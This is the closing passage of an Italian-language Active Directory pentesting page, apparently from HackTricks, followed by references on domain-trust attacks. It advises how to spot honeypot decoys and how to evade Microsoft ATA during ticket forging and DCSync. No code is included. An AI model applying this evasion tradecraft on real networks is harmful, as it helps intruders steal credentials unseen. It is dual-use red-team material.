- **Indicatori generali**: il confronto degli attributi dei potenziali oggetti esca con quelli degli oggetti autentici può rivelare incoerenze. Tool come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare queste deception.

### **Elusione dei sistemi di rilevamento**

- **Elusione del rilevamento Microsoft ATA**:
- **Enumerazione degli utenti**: evitare l’enumerazione delle sessioni sui Domain Controllers per impedire il rilevamento da parte di ATA.
- **Impersonificazione dei ticket**: l’utilizzo di chiavi **aes** per la creazione dei ticket aiuta a eludere il rilevamento, evitando il downgrade a NTLM.
- **Attacchi DCSync**: è consigliato eseguirli da un host diverso da un Domain Controller per evitare il rilevamento da parte di ATA, poiché l’esecuzione diretta da un Domain Controller attiverà gli alert.

## References

- [1] [Una guida all’attacco delle trust tra domini](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Falsificazione delle trust per la deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Da Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Raccolta LDAP BOF - Toolkit LDAP in-memory per lo sfruttamento di Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec - Holy Shuck! Weaponizing degli hash NTLM come wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) - Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs - Analisi di Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: acquisizione degli account Active Directory tramite Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Come gestire le modifiche alle connessioni del secure channel Netlogon associate a CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un viaggio nelle interfacce Null Session e MS-RPC dimenticate](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Il filtro SID come confine di sicurezza tra domini? (Parte 4) - Ricerca sull’elusione del SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Il filtro SID come confine di sicurezza tra domini? (Parte 5) - Attacco trust Golden GMSA - dal child al parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Il filtro SID come confine di sicurezza tra domini? (Parte 6) - Attacco trust tramite modifica dello schema - dal child al parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Da DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalation dagli admin del child domain agli enterprise admin in 5 minuti abusando di AD CS, seguito](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE nella manica: progettazione di backdoor DACL per Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
